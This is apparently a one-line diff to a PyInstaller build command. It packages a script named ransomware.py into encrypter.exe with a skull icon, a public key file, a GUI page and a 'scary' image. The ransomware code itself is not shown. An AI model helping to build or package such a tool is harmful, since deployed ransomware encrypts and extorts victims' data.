@@ -1,1 +1,1 @@
-python -m PyInstaller ransomware.py -Fyn encrypter.exe --distpath . -i skull-74-512.ico --add-data "public_key.pem;." --add-data "webpage/*;."
+python -m PyInstaller ransomware.py -Fyn encrypter.exe --distpath . -i skull-74-512.ico --add-data "public_key.pem;." --add-data "webpage/gui.html;." --add-data "webpage/scary.jpg;."
